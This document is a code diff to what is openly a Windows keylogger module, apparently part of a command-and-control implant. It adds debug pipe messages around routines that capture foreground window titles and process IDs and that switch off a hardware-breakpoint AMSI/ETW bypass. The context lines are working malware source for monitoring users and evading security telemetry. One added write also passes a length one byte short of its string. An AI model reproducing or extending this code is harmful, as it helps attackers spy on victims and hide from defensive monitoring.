@@ -111,8 +111,11 @@ auto DECLFN KeyloggerInstall(
         Instance->Win32.DispatchMessageW(&Msg);
     }
 
+	SafePipeWrite("[+] Exiting message loop\n", 25);
+
     // deactive hwbp to bypass amsi/etw
     if ( Instance->Ctx.Bypass ) {
+		SafePipeWrite("[+] Deactivating HWBP\n", 22);
         Hwbp::KeyloggerExit();
     }
 
@@ -267,20 +270,24 @@ VOID ProcessWindowTitle()
     // get current foreground/active window title
     if ((CurrentWindow = Instance->Win32.GetForegroundWindow()))
     {
+		SafePipeWrite("[+] Got foreground window\n", 26);
         // get the window title name and the associated process id 
         Instance->Win32.GetWindowThreadProcessId(CurrentWindow, &ProcessId);
         if (!Instance->Win32.GetWindowTextW(CurrentWindow, Buffer, sizeof(Buffer)))
         {
+			SafePipeWrite("[!] Failed to get window title\n", 30);
             Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L"(No Title)");
         }
 
         // check when ever the title has been changed.
         if (Instance->Win32.wcsncmp(Instance->g_TitleBuffer, Buffer, Instance->Win32.wcslen(Buffer)) != 0)
         {
+			SafePipeWrite("[+] Window title changed\n", 25);
             memcpy(Instance->g_TitleBuffer, Buffer, sizeof(Buffer));
 
             Instance->Win32.swprintf(Title, sizeof(Title), L"\n\n[%ld] %ls\n", ProcessId, Instance->g_TitleBuffer);
 
+			SafePipeWrite("[+] New Window Title: ", 22);
             SafePipeWrite(Title, (DWORD)(Instance->Win32.wcslen(Title) * sizeof(wchar_t)));
         }
     }
